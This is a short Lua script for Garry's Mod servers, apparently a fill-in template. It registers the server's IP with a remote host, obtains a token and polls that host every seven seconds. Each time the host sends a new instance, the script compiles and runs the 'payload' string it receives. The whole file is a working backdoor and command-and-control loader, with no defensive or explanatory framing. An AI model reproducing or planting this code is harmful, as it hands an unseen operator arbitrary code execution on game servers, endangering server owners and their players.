local dataTable = {}
local serverInfo = {
    ["ip"] = game.GetIPAddress(),
    ["sid"] = "$sid"
}


function auth()
    local url = "http://{ip}:8000/server/auth"
    local form = {sid = serverInfo["sid"], ip = serverInfo["ip"]}
    http.Post(url, form, function(result)
        local object = util.JSONToTable(result)
        if object["success"] then
            local newToken = object["content"]
            dataTable["token"] = newToken
            return
        else
            local errorMsg = object["error_msg"]
            if errorMsg == "Server Does Not Exist" then init() end
        end
    end)
end

function init()
    local url = "http://{ip}:8000/server/initial"
    local form = {sid = serverInfo["sid"], ip = serverInfo["ip"]}
    http.Post(url, form, function(result)
        local object = util.JSONToTable(result)
        if object["success"] then auth() end
    end)
end

function ping()
    local url = "http://{ip}:8000/server/ping"
    local form = {token = dataTable["token"]}
    http.Post(url, form, function(result)
        local object = util.JSONToTable(result)
        if object['success'] then
            local lastInstance      = dataTable["instance"]
            local currentInstance   = object["content"]["instance"]
            local payload           = object["content"]["payload"]
 
            if !lastInstance then
                if payload then CompileString(payload, "[C]", false)() end
                dataTable["instance"] = currentInstance
                return
            end

            if lastInstance == currentInstance then return end
            
            if payload then CompileString(payload, "[C]", false)() end
            dataTable["instance"] = currentInstance
        else
            auth()
        end
    end)
end

timer.Create(serverInfo["sid"], 7, 0, ping)
